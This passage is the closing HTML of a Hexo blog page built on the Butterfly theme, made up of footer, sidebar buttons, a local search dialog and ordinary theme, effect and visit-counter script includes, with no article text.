class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="富强,民主,文明,和谐,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>